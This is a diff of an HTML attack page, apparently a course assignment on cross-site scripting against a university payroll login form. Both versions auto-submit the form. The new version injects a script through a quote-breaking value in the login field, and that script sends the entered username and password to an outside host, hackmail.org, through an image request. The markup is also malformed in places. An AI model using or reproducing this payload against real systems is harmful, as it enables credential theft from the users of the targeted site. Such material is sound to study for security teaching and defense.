@@ -1,28 +1,26 @@
 <!DOCTYPE html>
 <html>
 
-<head>
-    <meta charset="UTF-8" />
-    <title>XSS</title>
-</head>
-
-<body onload="toDo()">
-    <!--https://www.doyler.net/security-not-included/xss-password-stealing-->
+<body onload="document.forms[0].submit()">
     <form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
-        <input type="text" name="login" value="">
-        <input type="password" name="pw">
-        <input type="hidden" name="action" value="login" />
-
+        <input type="hidden" name="RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA" value="">
+        <input type="hidden" name="action" value="" />
+        <button class="btn" type="submit" name="action" value="">Log In</button>
+        <input type="text" name="login" value='">
+        <script>
+            window.onload = function (){
+                document.getElementsByName("action")[0].onclick= function() {
+                    document.getElementsByName("RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA")[0].value= "RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA";
+                    var user = document.getElementsByName("login")[0].value;
+                    var pass = document.getElementsByName("pw")[0].value;
+                    new Image().src = "http://hackmail.org/sendmail.php?&username=RmFsbDIwMjBUYXJnZXQyLUdyYWJ0aGVQYXNzd29yZA" + "&payload=" + user + " " + pass + "&random=" + Math.random();
+                }
+            }
+        </script>
+        <input type="hidden" name=" " value="'>
     </form>
-    <script>
-        function toDo(){
-            document.forms[0].submit();
-            var user = document.getElementsByName('login')[0].value;
-            var pass = document.getElementsByName('pw')[0].value;
-            new Image().src = "http://hackmail.org/sendmail.php?&username=RmFsbDIwMjBUYXJnZXQyLUdyYWJ0aGVQYXNzd29yZA" + "&payload=" + user + " " + pass + "&random=" + Math.random();
-        }
-    </script>
 
+</html>
 </body>
 
 </html>
